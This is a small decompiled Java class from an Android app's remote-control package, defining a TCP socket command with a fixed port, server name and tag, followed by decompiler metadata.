package com.vvt.remotecontrol;

import com.fx.socket.TcpSocketCmd;

public class RemoteOnCommandReceive extends TcpSocketCmd {
  private static final long serialVersionUID = 169130551510599370L;
  
  public RemoteOnCommandReceive(ControlCommand paramControlCommand) {
    super(paramControlCommand, Object.class);
  }
  
  protected int getPort()
  {
    return 12512;
  }
  
  protected String getServerName()
  {
    return "com.vvt.rmtctrl.server";
  }
  
  protected String getTag()
  {
    return "RemoteOnCommandReceive";
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/remotecontrol/RemoteOnCommandReceive.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */